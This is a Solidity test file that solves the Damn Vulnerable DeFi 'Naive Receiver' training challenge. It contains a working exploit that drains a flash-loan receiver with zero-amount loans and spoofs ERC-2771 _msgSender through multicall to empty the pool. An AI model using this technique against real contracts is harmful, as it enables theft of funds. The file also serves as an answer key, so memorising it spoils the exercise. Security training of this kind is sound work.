// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     *
     * VULNERABILITIES EXPLOITED:
     * 1. Unauthenticated Flash Loan Initiator (`FlashLoanReceiver.onFlashLoan`):
     *    - `FlashLoanReceiver` checks `caller() == pool` (`msg.sender == pool`), but ignores the first
     *      parameter (`address initiator`).
     *    - Because `NaiveReceiverPool.flashLoan` allows `amount = 0` and charges a flat `FIXED_FEE = 1e18`
     *      credited to `deposits[feeReceiver]` (`deployer`), anyone can trigger 10 flash loans of `0 WETH`
     *      on `receiver` to drain all 10 WETH from `receiver` into `deposits[deployer]` inside the pool.
     *
     * 2. ERC-2771 `_msgSender()` Spoofing via `Multicall` (`delegatecall`) (CVE-2023-49795):
     *    - After 10 flash loans, `deposits[deployer]` holds all `1,010 WETH` (`1,000` initial + `10` fees).
     *    - `NaiveReceiverPool.withdraw()` deducts from `deposits[_msgSender()]`.
     *    - When called via `BasicForwarder` (`msg.sender == trustedForwarder`), `_msgSender()` extracts
     *      the last 20 bytes of `msg.data` (`msg.data[msg.data.length - 20:]`).
     *    - By routing `pool.multicall(callData)` through `BasicForwarder`, each sub-call `callData[i]`
     *      runs via `delegatecall`, which preserves `msg.sender == trustedForwarder` while replacing
     *      `msg.data` with `callData[i]`.
     *    - Appending `deployer`'s 20-byte address to the end of `callData[10]` (`withdraw`) tricks
     *      `_msgSender()` into returning `deployer`, draining all `1,010 WETH` to `recovery` in 1 transaction!
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // 11 sub-calls packed into a single multicall array (0..9 = flash loans, 10 = withdraw)
        bytes[] memory callData = new bytes[](11);

        // Step 1: Drain 10 WETH from `FlashLoanReceiver` into `deposits[deployer]` via 10 zero-amount flash loans
        for (uint256 i = 0; i < 10; i++) {
            callData[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, bytes("")));
        }

        // Step 2: Spoof `_msgSender() == deployer` on the 11th call (`callData[10]`) by gluing
        // `deployer`'s address onto the end of the `withdraw` calldata
        uint256 totalAmount = WETH_IN_POOL + WETH_IN_RECEIVER;
        callData[10] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (totalAmount, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );

        // Step 3: Wrap `pool.multicall(callData)` in a `BasicForwarder.Request` signed by `player`
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: abi.encodeCall(Multicall.multicall, (callData)),
            deadline: 1 days
        });

        // Step 4: Compute EIP-712 digest and sign with `playerPk`
        bytes32 requestHash =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Step 5: Execute in a single transaction (player nonce == 1 <= 2)
        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
